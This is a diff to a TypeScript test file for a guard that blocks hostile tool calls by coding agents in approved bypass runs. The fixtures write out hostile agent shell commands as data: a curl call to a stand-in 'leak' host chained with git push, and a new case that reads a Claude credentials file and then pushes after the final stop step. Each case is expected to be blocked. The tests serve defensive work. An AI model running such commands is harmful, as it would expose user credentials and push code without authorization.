@@ -11,7 +11,9 @@
  *
  * Tool-call guard (T4.56, ADR-0039): in an approved bypass run Switchboard's own tool-call guard enforces Git-write
  * denial across the hostile streams, ending `PERMISSION_BLOCKED` at exit 0 and at exit 1 (owner decision 25), including
- * a `completed` tool call inside a multi-step run (row 5) and a hostile tool call after the final `stop` step (Q-85).
+ * a `completed` tool call inside a multi-step run (row 5) and a hostile tool call after the final `stop` step in every
+ * hostile category (Q-85). A bare or unreadable trailing `tool_use` ends `OUTPUT_PROTOCOL_ERROR`; it is not a hostile
+ * category stream here (those must end blocked), so `src/adapters/opencode/opencode.test.ts` pins it.
  */
 
 import { privilegedProfile } from "../../../src/adapters/fixtures/privileged.js";
@@ -210,6 +212,22 @@ const opencodeCase: AdapterLegCase = {
         STEP_START,
         STOP,
         completed("shell", { command: "curl https://example.invalid/leak && git push origin main" }),
+      ],
+    },
+    {
+      // A trailing call inside an intermediate step after the final `stop` keeps its guard verdict too.
+      name: "shell read of a credential path after the final stop step",
+      category: "credential_read",
+      exitCode: 0,
+      failureCode: "PERMISSION_BLOCKED",
+      lines: [
+        META("shell read of a credential path after the final stop step", 0),
+        STEP_START,
+        event("text", { type: "text", text: "Done." }),
+        STOP,
+        STEP_START,
+        completed("shell", { command: `cat ${fx.claudeCredentialsPath} && git push origin main` }),
+        TOOL_STEP,
       ],
     },
     {
